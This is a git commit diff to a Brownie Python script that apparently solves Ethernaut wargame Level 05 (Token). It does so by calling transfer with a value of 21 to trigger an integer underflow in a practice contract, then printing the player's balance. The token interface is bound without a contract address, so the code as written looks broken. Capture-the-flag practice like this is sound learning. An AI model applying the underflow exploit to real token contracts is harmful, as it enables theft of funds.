47ccab87662ec85f938d6aa3de18d53d14f5c5cc
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-04 12:54:29 +0100

    updtaed 05-deploy_attack

--- scripts/05-deploy_attack.py
+++ scripts/05-deploy_attack.py
@@ -1,18 +1,20 @@
 from scripts.helpful_scripts import get_account
-from brownie import Attack05
+from brownie import interface, TokenInterface
 
 # new instance of Level 05 - Token
 ETHERNAUT_INSTANCE = "0x292597B71806e65B2c42b773055AAe6ed09bfC57"
 PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
+RANDOM_ADDRESS = "0x3826539Cbd8d68DCF119e80B994557B4278CeC9f"
 
 
 def main():
 
-    player = get_account()
-    # deploy attack contract
-    attacker_contract = Attack05.deploy(ETHERNAUT_INSTANCE, {"from": player})
-    print(f"attacker contract: {attacker_contract}")
+    acc = get_account()
+    token = interface.TokenInterface
 
-    # call transfer: (_to = random address, _value = 21)
+    # call transfer: (_to = random address, _value = 21, from acc)
+    tx = token.transfer(RANDOM_ADDRESS, 21, {"from": acc})
+    tx.wait(1)
 
-    # call balanceOf(PLAYER)
+    # call balanceOf(PLAYER) - view function, so no state change
+    print(f"New balance of PLAYER account = {token.balanceOf(PLAYER)}")
